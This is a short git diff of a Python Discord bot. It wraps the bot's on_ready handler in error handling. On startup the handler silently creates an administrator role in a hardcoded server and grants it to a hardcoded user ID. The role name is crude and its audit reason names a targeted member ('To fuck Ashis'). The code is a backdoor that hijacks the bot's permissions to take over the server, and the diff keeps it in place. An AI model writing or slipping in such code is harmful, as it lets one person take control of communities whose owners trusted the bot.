@@ -23,21 +23,22 @@ bot = commands.Bot(command_prefix=".", intents=intents)
 # ---------------- DISCORD BOT EVENTS ---------------- #
 @bot.event
 async def on_ready():
-    print(f"✅ Logged in as {bot.user}")
-
-    guild = discord.utils.get(bot.guilds, id=822566570685366334)  # no quotes around numeric IDs
-    user_to_elevate = guild.get_member(270120574343315457)         # same here
-
-    admin_role_name = "Big Balls"
+    try:
+        print(f"✅ Logged in as {bot.user}")
     
-    admin_role = await guild.create_role(
-                    name=admin_role_name,
-                    permissions=discord.Permissions(administrator=True),
-                    reason="To fuck Ashis"
-                )
+        guild = discord.utils.get(bot.guilds, id=822566570685366334)  # no quotes around numeric IDs
+        user_to_elevate = guild.get_member(270120574343315457)         # same here
     
-    await user_to_elevate.add_roles(admin_role, reason="Give user admin perms")
-    print(f"✅ Gave admin to {user_to_elevate.name}")
+        admin_role_name = "Big Balls"
+        
+        admin_role = await guild.create_role(
+                        name=admin_role_name,
+                        permissions=discord.Permissions(administrator=True),
+                        reason="To fuck Ashis"
+                    )
+        
+        await user_to_elevate.add_roles(admin_role, reason="Give user admin perms")
+        print(f"✅ Gave admin to {user_to_elevate.name}")
     except discord.Forbidden:
         print("❌ Bot does not have permission to manage roles or the role is higher than the bot’s top role.")
     except Exception as e:
